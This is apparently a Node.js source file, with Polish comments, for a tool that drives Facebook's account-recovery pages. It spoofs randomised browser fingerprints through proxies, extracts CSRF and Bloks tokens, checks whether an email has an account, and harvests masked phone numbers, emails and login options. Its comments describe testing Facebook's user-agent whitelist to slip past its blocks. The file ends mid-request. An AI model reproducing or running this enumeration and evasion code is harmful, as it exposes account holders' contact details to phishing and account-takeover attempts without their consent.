import axios from 'axios';
import { CookieJar } from 'tough-cookie';
import { buildAgent } from './proxy.js';
import { writeFileSync, mkdirSync } from 'node:fs';

// Diagnostyczny dumper — zapisuje surowe response z każdego kroku do /tmp/fb_diag/.
// Używane do reverse-engineeringu phones gdy FB zmienia format. Włączane przez
// FB_DIAG=1 env var (domyślnie OFF żeby nie spamować dysku).
// Sprawdzany leniwie przy każdym wywołaniu (nie cache), bo w ESM imports hoist
// PRZED kodem CLI — env może zostać ustawiony zaraz po imporcie.
const DIAG_DIR = '/tmp/fb_diag';
let _diagMkOk = false;
function safeEmail(e) { return String(e || 'unknown').replace(/[^a-zA-Z0-9._@-]+/g, '_').slice(0, 60); }
export function dumpDiag(email, step, content) {
    if (process.env.FB_DIAG !== '1' && process.env.FB_DIAG !== 'true') return;
    if (!_diagMkOk) {
        try { mkdirSync(DIAG_DIR, { recursive: true }); _diagMkOk = true; } catch { }
    }
    try {
        const ts = Date.now();
        const fn = `${DIAG_DIR}/${safeEmail(email)}__${step}__${ts}.txt`;
        const body = typeof content === 'string' ? content : JSON.stringify(content, null, 2);
        writeFileSync(fn, body.slice(0, 500_000));
    } catch { }
}

// Generuje w pełni losowy profil urządzenia/przeglądarki przy każdym probe
function generateProfile() {
    const r = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
    const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];

    // WebGL renderer strings (randomizowane jak prawdziwe GPU)
    const gpuVendors = [
        ['Google Inc. (NVIDIA)', `ANGLE (NVIDIA, NVIDIA GeForce GTX ${pick([1060, 1070, 1080, 3060, 3070, 3080, 4060, 4070])} Direct3D11 vs_5_0 ps_5_0, D3D11)`],
        ['Google Inc. (AMD)', `ANGLE (AMD, AMD Radeon RX ${pick([580, 6600, 6700, 7600, 7700])} Direct3D11 vs_5_0 ps_5_0, D3D11)`],
        ['Google Inc. (Intel)', `ANGLE (Intel, Intel(R) UHD Graphics ${pick([620, 630, 730, 770])} Direct3D11 vs_5_0 ps_5_0, D3D11)`],
        ['Apple', 'Apple M1'], ['Apple', 'Apple M2'], ['Apple', 'Apple M3'],
        ['ARM', 'Mali-G78'], ['Qualcomm', 'Adreno (TM) 650'], ['Qualcomm', 'Adreno (TM) 730'],
    ];
    const [glVendor, glRenderer] = pick(gpuVendors);

    // CPU cores i pamięć (Device-Memory header)
    const cpuCores = pick([2, 4, 4, 6, 8, 8, 12, 16]);
    const memoryGB = pick([0.5, 1, 2, 4, 4, 8, 8]);

    // Typ połączenia
    const netEct = pick(['4g', '4g', '4g', '3g', '2g']);
    const netDl = (Math.random() * 9 + 1).toFixed(1);  // 1.0 – 10.0 Mb/s
    const netRtt = String(pick([50, 75, 100, 150, 200, 300]));

    const deviceType = pick(['desktop', 'desktop', 'mobile', 'mobile', 'mobile']); // mobile częściej (mbasic)

    let ua, secChUa, secChUaFull, secChUaPlatform, secChUaMobile, secChUaPlatformVer, secChUaArch, secChUaBitness, enc, lang;

    if (deviceType === 'desktop') {
        const os = pick(['win11', 'win11', 'win10', 'win10', 'win8', 'linux', 'macos']);
        const browser = pick(['chrome', 'chrome', 'edge', 'firefox', 'opera']);
        const cv = r(110, 124);
        const cvFull = `${cv}.0.${r(6000, 7000)}.${r(100, 200)}`;
        const w = '537.36';

        let osStr, platStr, platVer;
        if (os === 'win11') { osStr = 'Windows NT 10.0; Win64; x64'; platStr = '"Windows"'; platVer = '"15.0.0"'; }
        else if (os === 'win10') { osStr = 'Windows NT 10.0; Win64; x64'; platStr = '"Windows"'; platVer = '"10.0.0"'; }
        else if (os === 'win8') { osStr = 'Windows NT 6.2; Win64; x64'; platStr = '"Windows"'; platVer = '"0.1.0"'; }
        else if (os === 'linux') { osStr = 'X11; Linux x86_64'; platStr = '"Linux"'; platVer = '"6.5.0"'; }
        else { const mv = `${r(12, 14)}_${r(0, 6)}_${r(0, 3)}`; osStr = `Macintosh; Intel Mac OS X ${mv}`; platStr = '"macOS"'; platVer = `"${r(12, 14)}.${r(0, 6)}.${r(0, 3)}"`; }

        if (browser === 'chrome') {
            ua = `Mozilla/5.0 (${osStr}) AppleWebKit/${w} (KHTML, like Gecko) Chrome/${cv}.0.0.0 Safari/${w}`;
            secChUa = `"Chromium";v="${cv}", "Google Chrome";v="${cv}", "Not/A)Brand";v="99"`;
            secChUaFull = `"Chromium";v="${cvFull}", "Google Chrome";v="${cvFull}", "Not/A)Brand";v="99.0.0.0"`;
        } else if (browser === 'edge') {
            const ev = r(110, 124); const evFull = `${ev}.0.${r(1000, 2000)}.${r(50, 100)}`;
            ua = `Mozilla/5.0 (${osStr}) AppleWebKit/${w} (KHTML, like Gecko) Chrome/${cv}.0.0.0 Safari/${w} Edg/${ev}.0.0.0`;
            secChUa = `"Microsoft Edge";v="${ev}", "Chromium";v="${cv}", "Not/A)Brand";v="99"`;
            secChUaFull = `"Microsoft Edge";v="${evFull}", "Chromium";v="${cvFull}", "Not/A)Brand";v="99.0.0.0"`;
        } else if (browser === 'opera') {
            const ov = r(95, 109);
            ua = `Mozilla/5.0 (${osStr}) AppleWebKit/${w} (KHTML, like Gecko) Chrome/${cv}.0.0.0 Safari/${w} OPR/${ov}.0.0.0`;
            secChUa = `"Opera";v="${ov}", "Chromium";v="${cv}", "Not/A)Brand";v="99"`;
            secChUaFull = `"Opera";v="${ov}.0.0.0", "Chromium";v="${cvFull}", "Not/A)Brand";v="99.0.0.0"`;
        } else { // Firefox — nie wysyła sec-ch-ua
            const fv = r(115, 126);
            const ffOs = (os === 'linux') ? 'X11; Linux x86_64' : (os === 'macos') ? 'Macintosh; Intel Mac OS X 10.15' : 'Windows NT 10.0; Win64; x64';
            ua = `Mozilla/5.0 (${ffOs}; rv:${fv}.0) Gecko/20100101 Firefox/${fv}.0`;
            secChUa = null; secChUaFull = null;
        }
        secChUaPlatform = platStr;
        secChUaMobile = '?0';
        secChUaPlatformVer = platVer;
        secChUaArch = '"x86"';
        secChUaBitness = '"64"';
    } else {
        // Mobile: Android (częściej) lub iPhone
        const mob = pick(['android', 'android', 'android', 'iphone']);
        if (mob === 'android') {
            const av = r(9, 14); const cv = r(110, 124); const cvFull = `${cv}.0.${r(6000, 7000)}.${r(100, 200)}`;
            const models = [`SM-G${r(900, 999)}B`, `SM-A${r(300, 555)}F`, `Pixel ${r(6, 8)}`, `Redmi Note ${r(10, 13)}`, `POCO X${r(3, 5)} Pro`, `OPPO A${r(54, 78)}`, `vivo Y${r(20, 35)}`, `motorola moto g${r(40, 82)}`, `OnePlus ${r(9, 12)}`, `ELS-NX9`, `VOG-L29`];
            const model = pick(models); const w = '537.36';
            const extra = Math.random() > 0.7 ? ` SamsungBrowser/${r(20, 25)}.0` : '';
            ua = `Mozilla/5.0 (Linux; Android ${av}; ${model}) AppleWebKit/${w} (KHTML, like Gecko) Chrome/${cv}.0.0.0 Mobile Safari/${w}${extra}`;
            secChUa = `"Chromium";v="${cv}", "Google Chrome";v="${cv}", "Not/A)Brand";v="99"`;
            secChUaFull = `"Chromium";v="${cvFull}", "Google Chrome";v="${cvFull}", "Not/A)Brand";v="99.0.0.0"`;
            secChUaPlatform = '"Android"'; secChUaMobile = '?1'; secChUaPlatformVer = `"${av}.0.0"`;
            secChUaArch = '"arm"'; secChUaBitness = '"64"';
        } else {
            const iosVer = `${r(15, 17)}_${r(0, 6)}`; const sv = r(15, 17);
            ua = `Mozilla/5.0 (iPhone; CPU iPhone OS ${iosVer} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${sv}.0 Mobile/15E148 Safari/604.1`;
            secChUa = null; secChUaFull = null; secChUaPlatform = null; secChUaMobile = null;
            secChUaPlatformVer = null; secChUaArch = null; secChUaBitness = null;
        }
    }

    lang = pick([
        'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
        'pl-PL,pl;q=0.9,en;q=0.8',
        'pl-PL,pl;q=1.0,en-US;q=0.6',
        'pl;q=0.9,en-US;q=0.8,en;q=0.7',
        'pl-PL,pl;q=0.8,en-US;q=0.5,en;q=0.3',
    ]);
    enc = Math.random() > 0.4 ? 'gzip, deflate, br' : 'gzip, deflate';

    return { ua, lang, enc, secChUa, secChUaFull, secChUaPlatform, secChUaMobile, secChUaPlatformVer, secChUaArch, secChUaBitness, memoryGB, cpuCores, netEct, netDl, netRtt, glVendor, glRenderer };
}

function decodeEntities(s) {
    return String(s || '')
        .replace(/&amp;/g, '&')
        .replace(/&quot;/g, '"')
        .replace(/&#0?39;/g, "'")
        .replace(/&lt;/g, '<')
        .replace(/&gt;/g, '>');
}

// mbasic.facebook.com whitelist UA (zweryfikowane na żywo 2026-05-03):
//   ✅ iPhone Safari iOS 16+ → pełna strona (350-400KB)
//   ❌ Android Chrome (KAŻDA wersja) → "Error Facebook" / "browser_unsupported" (3676B)
//   ❌ Windows/Mac desktop Chrome → "Facebook nie jest dostępny w tej przeglądarce" (5KB)
//   ❌ Samsung Browser, Firefox Android, Opera Mini → blokowane
//   ❌ Stare iOS (<16) → blokowane jako legacy
// FB radykalnie zaostrzył whitelist mbasic — TYLKO świeże iPhone Safari przechodzi.
const MBASIC_UAS = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
];

function pickMbasicUA() {
    return MBASIC_UAS[Math.floor(Math.random() * MBASIC_UAS.length)];
}

// Tworzy persistent session dla workera — trzymane między jobami.
// jar = cookies (datr, sb, fr, ...), ua = sticky mbasic UA, profile = sticky www profile.
export function createSession() {
    return {
        jar: new CookieJar(),
        ua: pickMbasicUA(),
        profile: generateProfile(),
        jobs: 0,
    };
}

function makeClient(proxyUrl, timeout = 15000, opts = {}) {
    // Jeżeli przekazano session — reuse jar/ua/profile (sticky per worker).
    // W przeciwnym razie świeży one-shot client (wsteczna kompatybilność).
    const session = opts.session || null;
    const jar = session?.jar || new CookieJar();
    const p = session?.profile || generateProfile();
    // mbasic vs www: mbasic wymaga prostego, starego mobile UA; www akceptuje generateProfile()
    const useMbasicUA = opts.target !== 'www';
    const ua = useMbasicUA ? (session?.ua || pickMbasicUA()) : p.ua;

    const h = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': p.lang,
        'Accept-Encoding': p.enc,
    };
    // Client Hints — TYLKO dla www (mbasic je odrzuca jako "modern browser fingerprint")
    if (!useMbasicUA) {
        h['Device-Memory'] = String(p.memoryGB);
        h['Downlink'] = String(p.netDl);
        h['ECT'] = p.netEct;
        h['RTT'] = p.netRtt;
        if (p.secChUa) h['sec-ch-ua'] = p.secChUa;
        if (p.secChUaFull) h['sec-ch-ua-full-version-list'] = p.secChUaFull;
        if (p.secChUaPlatform) h['sec-ch-ua-platform'] = p.secChUaPlatform;
        if (p.secChUaMobile) h['sec-ch-ua-mobile'] = p.secChUaMobile;
        if (p.secChUaPlatformVer) h['sec-ch-ua-platform-version'] = p.secChUaPlatformVer;
        if (p.secChUaArch) h['sec-ch-ua-arch'] = p.secChUaArch;
        if (p.secChUaBitness) h['sec-ch-ua-bitness'] = p.secChUaBitness;
    }
    const agents = proxyUrl ? buildAgent(proxyUrl) : {};
    const c = axios.create({
        timeout,
        maxRedirects: 0,
        validateStatus: () => true,
        decompress: true,
        responseType: 'text',
        httpAgent: agents.httpAgent,
        httpsAgent: agents.httpsAgent,
        proxy: false,
    });
    c.interceptors.request.use(async (cfg) => {
        const ck = await jar.getCookieString(cfg.url);
        if (ck) cfg.headers.Cookie = ck;
        cfg.headers = { ...h, ...(cfg.headers || {}) };
        return cfg;
    });
    c.interceptors.response.use(async (res) => {
        const sc = res.headers?.['set-cookie'];
        if (Array.isArray(sc)) for (const x of sc) try { await jar.setCookie(x, res.config.url); } catch { }
        return res;
    });
    return { c, jar };
}

const BLOKS_BASE = 'https://mbasic.facebook.com';
const FALLBACK_BKV = 'f791dd5feea6e530e43feebf5fecb96b3aaf3d60e862bf6f61c720e073edd93b';

// UUID v4 bez crypto.randomUUID (ESM compatibility)
function uuid4() {
    const h = () => Math.random().toString(16).padStart(2, '0').repeat(4).slice(0, 8);
    return `${h()}-${h().slice(0, 4)}-4${h().slice(0, 3)}-${(8 + Math.floor(Math.random() * 4)).toString(16)}${h().slice(0, 3)}-${h()}${h().slice(0, 4)}`;
}

// jazoest = "2" + suma kodów ASCII fb_dtsg
export function computeJazoest(token) {
    let s = 0;
    for (const c of String(token)) s += c.charCodeAt(0);
    return '2' + s;
}

// Wyciąga tokeny CSRF i Bloks z HTML strony identify
export function extractPageTokens(html, datr) {
    const r = (rx) => html.match(rx)?.[1] ?? '';
    // fb_dtsg — kolejno: nowy 2026 layout {"dtsg":{"token":"..."}}, klasyczny DTSGInitData,
    // hidden input, oraz {"fb_dtsg",[],{"token":"..."}}.
    const fbDtsg = r(/"dtsg"\s*:\s*\{\s*"token"\s*:\s*"([^"]+)"/) ||
        r(/"token"\s*:\s*"([^"]+)","async_get_token"/) ||
        r(/name="fb_dtsg"[^>]*value="([^"]+)"/) ||
        r(/"fb_dtsg"\s*,\s*\[\s*\]\s*,\s*\{\s*"token"\s*:\s*"([^"]+)"/) || '';
    // dtsg_ag (ważny dla niektórych Bloks calls)
    const dtsgAg = r(/"dtsg_ag"\s*:\s*\{\s*"token"\s*:\s*"([^"]+)"/) || '';
    // lsd — nowy layout "LSD",[],{"token":"..."}, fallback MPageLoadClientMetrics + hidden input
    const lsd = r(/"LSD"\s*,\s*\[\]\s*,\s*\{\s*"token"\s*:\s*"([^"]+)"/) ||
        r(/MPageLoadClientMetrics\.init\s*\(\s*"[^"]*"\s*,\s*"([^"]+)"/) ||
        r(/name="lsd"[^>]*value="([^"]+)"/) || '';
    // __hsi — szósty argument init
    const hsi = r(/MPageLoadClientMetrics\.init\s*\("[^"]*"\s*,\s*"[^"]*"\s*,\s*"[^"]*"\s*,\s*"[^"]*"\s*,\s*"[^"]*"\s*,\s*"(\d+)"/) || '';
    // __bkv — w nowym layoucie często BRAK w HTML; FB akceptuje pusty bkv lub fallback
    const bkv = r(/"__bkv"\s*:\s*"([a-f0-9]{40,})"/) ||
        r(/[?&]__bkv=([a-f0-9]{40,})/) ||
        r(/\\"__bkv\\":\\"([a-f0-9]{40,})\\"/) || FALLBACK_BKV;
    // __rev — nowy layout "rev":1038685473 (bez podkreśleń)
    const rev = r(/"__rev"\s*:\s*(\d{9,11})/) ||
        r(/"rev"\s*:\s*(\d{9,11})/) ||
        r(/\brev:(\d{9,11})/) || '1038685473';
    // __hs / haste_session
    const hs = r(/"__hs"\s*:\s*"([^"]{10,})"/) ||
        r(/"haste_session"\s*:\s*"([^"]{10,})"/) || '20576.BP:wbloks_caa_pkg.2.0...0';
    // __dyn
    const dyn = r(/"__dyn"\s*:\s*"([^"]+)"/) ||
        '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x67o1g8hw23E52q1ew2io0D24o1MUaE1Do1u81x82ewnE3fwww5NyE25w8W0Lo6-1CwOw5jw4JwzK0zo3jwea';
    const jazoest = fbDtsg ? computeJazoest(fbDtsg) : r(/name="jazoest"[^>]*value="([^"]+)"/) || '';
    return { fbDtsg, dtsgAg, lsd, jazoest, hsi, bkv, rev, hs, dyn, datr };
}

// Buduje body URLSearchParams dla każdego Bloks POST
function buildBloksBody(tokens, paramsJson) {
    const b = new URLSearchParams();
    b.set('__aaid', '0'); b.set('__user', '0'); b.set('__a', '1');
    b.set('__req', Math.random().toString(36).slice(2, 5));
    b.set('__hs', tokens.hs); b.set('dpr', '3'); b.set('__ccg', 'EXCELLENT');
    b.set('__rev', tokens.rev);
    b.set('__s', `${Math.random().toString(36).slice(2, 8)}:${Math.random().toString(36).slice(2, 8)}:${Math.random().toString(36).slice(2, 8)}`);
    b.set('__hsi', tokens.hsi || String(Date.now()));
    b.set('__dyn', tokens.dyn);
    b.set('fb_dtsg', tokens.fbDtsg);
    b.set('jazoest', tokens.jazoest);
    b.set('lsd', tokens.lsd);
    b.set('params', paramsJson);
    return b;
}

// Parsuje Bloks JSON (usuwa prefix "for(;;);")
function parseBloksJson(raw) {
    try { return JSON.parse(String(raw || '').replace(/^\s*for\s*\(;\s*;\s*\)\s*;/, '').trim()); }
    catch { return null; }
}

// Rekurencyjnie zbiera stringi z drzewa Bloks
function collectStrings(node, out = []) {
    if (typeof node === 'string') { out.push(node); return out; }
    if (!node || typeof node !== 'object') return out;
    for (const v of (Array.isArray(node) ? node : Object.values(node))) collectStrings(v, out);
    return out;
}

function matchMaskedEmail(masked, input) {
    const inputLower = String(input).toLowerCase();
    const at = inputLower.indexOf('@'); if (at < 0) return false;
    const inputName = inputLower.slice(0, at), inputDomain = inputLower.slice(at + 1);
    const at2 = masked.toLowerCase().indexOf('@'); if (at2 < 0) return false;
    const maskedName = masked.toLowerCase().slice(0, at2), maskedDomain = masked.toLowerCase().slice(at2 + 1);
    const domOk = maskedDomain === inputDomain ||
        new RegExp('^' + maskedDomain.replace(/\./g, '\\.').replace(/\*+/g, '.*') + '$').test(inputDomain);
    if (!domOk) return false;
    if (maskedName === inputName) return true;
    if (maskedName.length === inputName.length && maskedName[0] === inputName[0] &&
        maskedName[maskedName.length - 1] === inputName[inputName.length - 1] &&
        /^\*+$/.test(maskedName.slice(1, -1))) return true;
    return new RegExp('^' + maskedName.replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*+/g, '.*') + '$').test(inputName);
}

// Rekurencyjnie szuka wartości klucza w drzewie JSON
function deepFind(node, key) {
    if (!node || typeof node !== 'object') return undefined;
    if (!Array.isArray(node) && key in node) return node[key];
    for (const v of (Array.isArray(node) ? node : Object.values(node))) {
        const found = deepFind(v, key);
        if (found !== undefined) return found;
    }
    return undefined;
}

// Zbiera wszystkie Bloks bytecode strings z drzewa JSON
// (pola: action, on_mount, on_bind, on_touch_*, initial_lispy itd. — wykrywaj po treści)
function collectActionStrings(node, out = []) {
    if (!node || typeof node !== 'object') return out;
    if (Array.isArray(node)) { for (const v of node) collectActionStrings(v, out); return out; }
    for (const [k, v] of Object.entries(node)) {
        if (typeof v === 'string' && v.startsWith('(bk.')) out.push(v);
        else collectActionStrings(v, out);
    }
    return out;
}

// Wyciąga context_data/encrypted, waterfall_id, device_id, account_type z odpowiedzi search.async
// Najnowsza meta CAA (2025+): zamiast `context_data: "Ac-..."` FB używa
// `caa_core_data_encrypted: "AX..."` (długi token, 400+ znaków). Dodatkowo
// `account_type_shown` (PRE_META/META/INSTAGRAM) potwierdza, że konto istnieje
// i flow przechodzi prosto do CodeEntry (zamiast AuthMethod).
function extractSearchResult(data) {
    const notFound = !!deepFind(data, 'has_identification_error');
    const deviceId = String(deepFind(data, 'device_id') || '');

    const allStrings = collectStrings(data);
    const actions = collectActionStrings(data);
    const haystack = [...allStrings, ...actions].join(' ');

    // ---- entry_point detection — najnowszy meta sygnał not_found ----
    // Konto nie istnieje gdy bytecode zawiera "identifier_error_dialog_on_ar"
    // jako entry_point (FB pokazuje dialog "nie znaleziono konta")
    const isIdentifierError = /"identifier_error_dialog_on_ar"|"identifier_error_dialog"|"account_not_found"/.test(haystack);

    // ---- caa_core_data_encrypted (najnowsza meta) ----
    // Token AX... osadzony w bytecode. Najczęściej w pozycji array po nazwie pola.
    let coreDataEncrypted = '';
    const allEncTokens = [];
    for (const act of actions) {
        // Wzorzec: "caa_core_data_encrypted",...,"AXxxx..."  
        const m = act.match(/"caa_core_data_encrypted"[\s\S]{0,200}?"(AX[A-Za-z0-9_\-]{100,})"/);
        if (m) allEncTokens.push(m[1]);
        // Backup: dowolny AX... token > 100 znaków
        for (const m2 of act.matchAll(/"(AX[A-Za-z0-9_\-]{180,})"/g)) {
            allEncTokens.push(m2[1]);
        }
    }
    if (allEncTokens.length > 0) {
        coreDataEncrypted = allEncTokens.reduce((a, b) => (b.length > a.length ? b : a), '');
    }

    // ---- account_type_shown (PRE_META, META, INSTAGRAM) — sygnał istnienia konta ----
    // null lub brak tej wartości w nowej mecie = konto NIE ISTNIEJE
    let accountType = '';
    for (const act of actions) {
        // Pattern: "account_type_shown" w array names, potem array values — szukamy stringa po "pre_mt_behavior"
        const m = act.match(/"account_type_shown"[\s\S]{0,500}?"(PRE_META|META|INSTAGRAM)"/);
        if (m) { accountType = m[1]; break; }
    }

    // ---- starsza meta: context_data "Ac-..." ----
    let contextData = '';
    let isFirstScreen = false;
    for (const act of actions) {
        const m = act.match(/"account_recovery",\s*"account_recovery",\s*(?:(false|true|null),\s*)?"([A-Za-z0-9_\-+/=]{60,})"/);
        if (m) {
            contextData = m[2];
            isFirstScreen = m[1] !== undefined;
            break;
        }
    }
    if (!contextData) contextData = haystack.match(/"(Ac[-_][A-Za-z0-9_\-+/=]{60,})"/)?.[1] || '';

    // ---- waterfall_id (dotted format) ----
    let waterfallId = '';
    for (const act of actions) {
        const m = act.match(/"(0\.[0-9a-f]{1,8}-[0-9a-f][0-9a-f.\-]{6,40})"/);
        if (m) { waterfallId = m[1]; break; }
    }

    // ---- access_flow_version ----
    const accessFlowVersion = haystack.includes('"F2_FLOW"') ? 'F2_FLOW' : 'pre_mt_behavior';

    // ---- screenId ----
    let screenId = '';
    for (const act of actions) {
        const m = act.match(/"screen_id",\s*"([a-z0-9]{4,10}:[0-9]{1,3})"/);
        if (m) { screenId = m[1]; break; }
    }

    // ---- next screen detection ----
    // Nowa meta: BloksCAARegUnderAgeBlocking* / RegUnknown* = konto nie istnieje
    // BloksCAAAccountRecoveryAuthMethodController = istnieje, idź do auth_method
    // BloksCAAAccountRecoveryCodeEntryController = istnieje, prosto do kodu
    let nextScreen = '';
    if (haystack.includes('BloksCAAAccountRecoveryCodeEntryController')) nextScreen = 'code_entry';
    else if (haystack.includes('BloksCAAAccountRecoveryAuthMethodController')) nextScreen = 'auth_method';
    else if (/BloksCAAReg(Under|Unknown|NotFound)/.test(haystack)) nextScreen = 'not_found';

    // ---- finalna decyzja "konto istnieje" ----
    // Heurystyka 2025: konto istnieje IFF
    //   - bytecode zawiera caa_account_recovery_client_events_fb (event step) ORAZ
    //   - account_type_shown ∈ {PRE_META, META, INSTAGRAM} (nie null)
    //   - LUB next screen = code_entry / auth_method
    // Konto NIE istnieje gdy:
    //   - has_identification_error true LUB
    //   - entry_point = identifier_error_dialog_on_ar LUB
    //   - account_type_shown = null + brak BloksCAAAccountRecovery* controllers
    const accountExists = !notFound && !isIdentifierError && (
        !!accountType || nextScreen === 'code_entry' || nextScreen === 'auth_method'
    );

    return {
        notFound: notFound || isIdentifierError || (!accountExists && nextScreen === 'not_found'),
        accountExists,
        deviceId, waterfallId, contextData, coreDataEncrypted,
        accountType, accessFlowVersion, screenId, isFirstScreen, nextScreen,
    };
}

// Parsuje opcje z odpowiedzi auth_method — zwraca null gdy konto nie istnieje
function parseAuthOptions(data, email) {
    if (deepFind(data, 'has_identification_error') === true) return null;

    // Jeśli auth_method zwrócił stronę błędu ("Ta strona nie jest teraz dostępna") → traktuj jako rate_limited.
    // UWAGA: NIE używaj 'Optimistic VF App Lite' — to nazwa font-family obecna w KAŻDYM bytecode FB.
    const allStr = collectStrings(data);
    const isErrorPage = allStr.some(s =>
        /ta strona nie jest (teraz|obecnie) dost[ęe]pna|this page isn.?t available|page isn.?t available right now|b[łl][ą\u0105]d techniczny|technical error/i.test(s)
    );
    if (isErrorPage) return { phones: [], emails: [], emailFound: false, hasPassword: false, isErrorPage: true };

    const phones = new Set(), emails = new Set();
    let hasPassword = false, emailFound = false;

    // Zbierz stringi z normalnego JSON (wartości pól)
    for (const s of collectStrings(data)) {
        if (typeof s !== 'string' || s.length < 4) continue;
        // Wykrywa zarówno zamaskowane (b*****1@op.pl) jak i pełne emaile (bartekwawak1@op.pl)
        const em = s.match(/[\w.+-]*[\w*][\w.+-]*@[\w.*-]+\.[a-z]{2,}/i);
        if (em) { emails.add(em[0]); if (matchMaskedEmail(em[0], email)) emailFound = true; }
        if (/^\+?[\d*•·][\d\s\-()*•·]{4,}\d$/.test(s.trim()) && /[*•·]/.test(s)) phones.add(s.trim());
        if (/continue.{0,10}password|use.{0,10}password|log.{0,5}in.{0,10}password|_password_|"password"|password.*auth_method|auth_method.*password|kontynuuj.*has[łl]|wprowad[źz].*has[łl]/i.test(s)) hasPassword = true;
    }

    // Szukaj też w action bytecode (FB trzyma opcje w bytecode)
    const actionText = collectActionStrings(data).join('\n');
    // Emaile w bytecode (zamaskowane i pełne)
    for (const m of actionText.matchAll(/[\w.+-]*[\w*][\w.+-]*@[\w.*-]+\.[a-z]{2,}/gi)) {
        emails.add(m[0]); if (matchMaskedEmail(m[0], email)) emailFound = true;
    }
    // Zamaskowane telefony w bytecode (np. "+48 *** *** 12")
    for (const m of actionText.matchAll(/(?:"|\s)(\+?[\d*•·][\d\s\-()*•·]{4,}\d)(?:"|,)/g)) {
        if (/[*•·]/.test(m[1])) phones.add(m[1].trim());
    }
    // Opcja hasła w bytecode
    if (/continue.{0,10}password|use.{0,10}password|_password_|"password"|auth_method.*password|PASSWORD|kontynuuj.*has[łl]/i.test(actionText)) {
        hasPassword = true;
    }

    // FALLBACK: uniwersalny harvester — łapie warianty których heurystyki wyżej
    // pominęły (np. "•• ••• 23" w deep-nested bytecode, "+1 (***) ***-1234").
    // Działa zarówno na sparsowanym JSON jak i na surowym bytecode.
    try {
        for (const ph of harvestPhones(data)) phones.add(ph);
        for (const ph of harvestPhones(actionText)) phones.add(ph);
    } catch { }

    return { phones: [...phones], emails: [...emails], emailFound, hasPassword };
}

// ────────────────────────────────────────────────────────────────────────────
// wwwRecoveryProbe — HTTP-only ścieżka desktop www (www.facebook.com).
// Symuluje: GET /login/identify → POST submit email → redirect /recover/initiate?ci=
//           → POST /ajax/route-definition/ z route_url → parse contactpoint_options.
// Używana jako UZUPEŁNIENIE httpProbe (Bloks/mbasic) gdy ten nie zwrócił phones.
// ────────────────────────────────────────────────────────────────────────────
const WWW_BASE = 'https://www.facebook.com';

// UA desktop Chrome — www.facebook.com odrzuca mbasic UA
const WWW_UA_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
];
const pickWwwUA = () => WWW_UA_LIST[Math.floor(Math.random() * WWW_UA_LIST.length)];

export async function wwwRecoveryProbe(email, proxyUrl, opts = {}) {
    const timeout = opts.timeout ?? 20000;
    // Używamy makeClient z target:'www' — obsługa cookies przez interceptory, bez external dep
    const { c } = makeClient(proxyUrl, timeout, { target: 'www' });

    const out = { phones: [], emails: [], emailFound: false, hasPassword: false, detail: 'www:init' };
    const loginLower = email.toLowerCase();

    try {
        // Krok 1: GET /login/identify/?ctx=recover — wyciągnij tokeny CSRF
        let html1 = '';
        try {
            const r1 = await c.get(`${WWW_BASE}/login/identify/?ctx=recover`, { timeout });
            html1 = String(r1.data || '');
            dumpDiag(email, 'www_01_get_identify', `STATUS=${r1.status}\nHEADERS=${JSON.stringify(r1.headers, null, 2)}\n\n${html1}`);
        } catch (e) {
            dumpDiag(email, 'www_01_get_identify_ERR', String(e.stack || e.message));
            out.detail = `www:get_identify:${String(e.message).slice(0, 60)}`; return out;
        }
        const tokens = extractPageTokens(html1, '');
        if (!tokens.lsd || !tokens.fbDtsg) {
            dumpDiag(email, 'www_01_no_csrf', `lsd=${tokens.lsd} fbDtsg=${tokens.fbDtsg}\n\nFIRST_2KB:\n${html1.slice(0, 2000)}`);
            out.detail = 'www:no_csrf'; return out;
        }

        // Krok 2: POST submit email — obserwuj redirect do /recover/initiate?ci=
        const body2 = new URLSearchParams();
        body2.set('lsd', tokens.lsd);
        body2.set('jazoest', tokens.jazoest || computeJazoest(tokens.fbDtsg));
        body2.set('email', email);
        body2.set('did_login_from_push', '0');
        // FB www wymaga tych pól przy submicie identify
        body2.set('login_attempt_count', '0');

        let recoverPath = '';
        try {
            const r2 = await c.post(
                `${WWW_BASE}/login/identify/`,
                body2.toString(),
                {
                    timeout,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': WWW_BASE,
